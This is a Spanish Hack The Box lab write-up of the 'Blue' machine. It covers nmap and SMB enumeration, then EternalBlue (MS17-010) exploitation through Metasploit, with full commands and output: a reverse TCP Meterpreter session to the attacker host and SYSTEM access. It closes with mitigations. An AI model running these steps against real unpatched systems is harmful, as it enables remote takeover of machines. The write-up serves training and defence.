---
title: "HTB Write-up: Blue"
date: 2026-03-28
draft: false
description: "Write-up de la máquina Blue de Hack The Box. Dificultad Easy con OS Windows 7 SP1. Explotación del famoso EternalBlue (MS17-010) mediante Metasploit para obtener acceso directo como SYSTEM."
tags: ["HackTheBox", "Windows", "Easy", "EternalBlue", "MS17-010", "Metasploit", "SMB", "RCE"]
categories: ["HTB Walkthroughs"]
series: ["HackTheBox CPTS"]
---

{{< lead >}}
Resolución de **Blue**, otra máquina icónica de Hack The Box. Dificultad **Easy** con OS **Windows 7 SP1**. El vector es el infame exploit **EternalBlue** (MS17-010), una vulnerabilidad en SMBv1 que compromete el kernel de Windows y nos entrega acceso directo como **NT AUTHORITY\SYSTEM**.
{{< /lead >}}

{{< badge >}}HackTheBox{{< /badge >}}
{{< badge >}}Windows{{< /badge >}}
{{< badge >}}Easy{{< /badge >}}

---

## 🗺️ Información de la Máquina

| Campo          | Detalle                                         |
|----------------|-------------------------------------------------|
| **Nombre**     | Blue                                            |
| **OS**         | Windows 7 Professional SP1 (x64)               |
| **Dificultad** | Easy                                            |
| **IP**         | 10.129.10.54                                    |
| **Técnicas**   | SMB Enumeration, EternalBlue, Kernel Exploit    |
| **CVE / MS**   | MS17-010 (CVE-2017-0144)                        |

---

## 📑 1. Reconocimiento

El objetivo es identificar la versión exacta del SO y los servicios expuestos, ya que contra Windows el detalle importa: una diferencia de Service Pack o de arquitectura puede hacer que un exploit no funcione.

### Escaneo de Puertos y Versiones

```bash
┌─[root@htb]─[~]
└──╼ #nmap -sV 10.129.10.54
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds
49152/tcp open  msrpc        Microsoft Windows RPC
... (puertos RPC adicionales)
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Los puertos **135, 139 y 445** son el patrón característico de un sistema Windows con el stack de NetBIOS y SMB expuesto. El nombre del host `HARIS-PC` nos indica que es probablemente una máquina de escritorio, no un servidor corporativo hardened.

### Identificación Precisa del Sistema Operativo

El flag `-sV` nos da el servicio pero no la versión exacta de Windows. Usamos `-sC` (scripts por defecto de Nmap) sobre el puerto 445 para extraer el detalle completo mediante el script `smb-os-discovery`.

```bash
┌─[root@htb]─[~]
└──╼ #nmap -sC 10.129.10.54 -p 445
PORT    STATE SERVICE
445/tcp open  microsoft-ds
Host script results:
| smb-os-discovery:
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|_  System time: 2026-03-28T15:00:03+00:00
```

**Análisis:** Confirmado — **Windows 7 Professional SP1 x64**. Esta versión es críticamente vulnerable a **EternalBlue (MS17-010)** si no tiene el parche de seguridad aplicado, lo cual en HTB podemos asumir. Microsoft lanzó el parche en marzo de 2017, pero esta máquina permanece sin parchear como objetivo de laboratorio.

---

## 📂 2. Enumeración SMB

Antes de lanzar el exploit, confirmamos el nivel de acceso que tenemos sobre los recursos compartidos. Esto nos ayuda a entender si hay alguna vía alternativa (por ejemplo, archivos con credenciales) y a verificar que SMBv1 está activo.

### Listado de Recursos Compartidos

```bash
┌─[root@htb]─[~]
└──╼ #smbclient -N -L //10.129.10.54

    Sharename       Type      Comment
    ---------       ----      -------
    ADMIN$          Disk      Remote Admin
    C$              Disk      Default share
    IPC$            IPC       Remote IPC
    Share           Disk
    Users           Disk
```

Los recursos son visibles sin autenticación (`-N` = null session), pero `smbmap` nos confirma que no tenemos permisos de lectura o escritura directos sobre ninguno de ellos:

```bash
[!] Access denied on 10.129.10.54, no fun for you...
```

Sin credenciales válidas no podemos acceder a los archivos. El único camino es explotar la vulnerabilidad del servicio en sí.

---

## 💥 3. Explotación — EternalBlue (MS17-010)

### ¿Qué es EternalBlue?

**EternalBlue** es un exploit desarrollado por la NSA y filtrado públicamente por el grupo Shadow Brokers en abril de 2017. Explota una vulnerabilidad de **desbordamiento de búfer en el pool no paginado del kernel de Windows** al procesar paquetes **SMBv1** especialmente diseñados.

El proceso ocurre así:
1. El atacante envía un paquete SMBv1 malformado al puerto 445.
2. El kernel de Windows no valida correctamente el tamaño del buffer al procesarlo.
3. Se sobreescribe memoria del kernel, permitiendo la inyección de shellcode.
4. El shellcode se ejecuta con privilegios de **SYSTEM** porque el proceso `srv.sys` corre en modo kernel.

No es necesario tener credenciales previas. Si el puerto 445 es accesible y SMBv1 está habilitado, la máquina es vulnerable.

### Configuración del Exploit en Metasploit

```bash
[msf](Jobs:0 Agents:0) >> search Windows 2017 blue
[msf](Jobs:0 Agents:0) >> use exploit/windows/smb/ms17_010_eternalblue
[msf](Jobs:0 Agents:0) >> set RHOSTS 10.129.10.54
[msf](Jobs:0 Agents:0) >> set LHOST tun0
LHOST => 10.10.15.237
```

El módulo `ms17_010_eternalblue` es el puerto oficial de Metasploit del exploit. El payload por defecto crea una sesión **Meterpreter** de 64 bits, adecuada para la arquitectura x64 del objetivo.

### Ejecución

```bash
[msf](Jobs:0 Agents:0) >> run
[*] Started reverse TCP handler on 10.10.15.237:4444
[+] 10.129.10.54:445 - Host is likely VULNERABLE to MS17-010!
[+] 10.129.10.54:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] Sending stage (244806 bytes) to 10.129.10.54
[*] Meterpreter session 1 opened (10.10.15.237:4444 -> 10.129.10.27:49158)
```

La línea clave es `ETERNALBLUE overwrite completed successfully` — el kernel ha sido comprometido y el stage de Meterpreter ha sido inyectado en la memoria del proceso. La sesión se abre en segundos.

---

## 🏁 4. Post-Explotación y Flags

### Verificación de Privilegios

```bash
(Meterpreter 2)(C:\Windows\system32) > getuid
Server username: NT AUTHORITY\SYSTEM
```

**NT AUTHORITY\SYSTEM** es el nivel de privilegio máximo en Windows, equivalente a `root` en Linux. No se requiere ningún paso de escalada de privilegios adicional — EternalBlue nos entrega el control total de la máquina desde el primer momento.

### 🚩 User Flag (Haris)

```bash
(Meterpreter 2)(C:\Users\haris\Desktop) > cat user.txt
```

{{< spoiler text="user.txt" >}}
`********************************`
{{< /spoiler >}}

### 👑 Root Flag (Administrator)

```bash
(Meterpreter 2)(C:\Users\Administrator\Desktop) > cat root.txt
```

{{< spoiler text="root.txt" >}}
`********************************`
{{< /spoiler >}}

---

## 📝 5. Resumen y Lecciones Aprendidas

**Ruta de compromiso:**
1. **Recon** → Nmap detecta Windows 7 SP1 con SMB (445) expuesto sin parchear.
2. **Enumeración** → SMBv1 activo, acceso null session visible pero sin permisos de archivo.
3. **Foothold** → MS17-010 con Metasploit (`ms17_010_eternalblue`) → shell directa como **SYSTEM**.

**Lo que aprendí con esta máquina:**
- La identificación precisa del SO (versión + SP + arquitectura) es crucial antes de seleccionar un exploit. La diferencia entre SP1 y sin SP puede determinar si funciona o no.
- EternalBlue no requiere credenciales: el único requisito es que el puerto 445 sea accesible y SMBv1 esté habilitado.
- Algunos exploits de nivel kernel entregan privilegios máximos sin necesidad de escalada — esto simplifica el proceso pero también muestra la gravedad de la vulnerabilidad.
- Esta misma vulnerabilidad fue el vector inicial de **WannaCry** y **NotPetya**, dos de los ciberataques más destructivos de la historia.

---

## 🛠️ 6. Mitigaciones (Hardening)

| Problema                          | Recomendación                                                                                     |
|-----------------------------------|---------------------------------------------------------------------------------------------------|
| MS17-010 sin parchear             | Aplicar el boletín **MS17-010** (KB4012212). Es la defensa más crítica contra este vector.       |
| SMBv1 habilitado                  | Deshabilitar SMBv1 completamente. Usar únicamente SMBv2 o SMBv3.                                 |
| Windows 7 sin soporte             | EOL desde enero de 2020. Migrar a un SO con soporte activo (Windows 10/11 o Windows Server).     |
| SMB expuesto a toda la red        | Segmentar la red y bloquear el puerto 445 desde el exterior. Aislar máquinas legacy.             |

> **Nota histórica:** EternalBlue fue el motor detrás de **WannaCry** (mayo 2017) y **NotPetya** (junio 2017), que infectaron cientos de miles de sistemas en horas. A pesar del parche disponible desde marzo de 2017, muchas organizaciones no lo habían aplicado cuando ocurrieron los ataques.
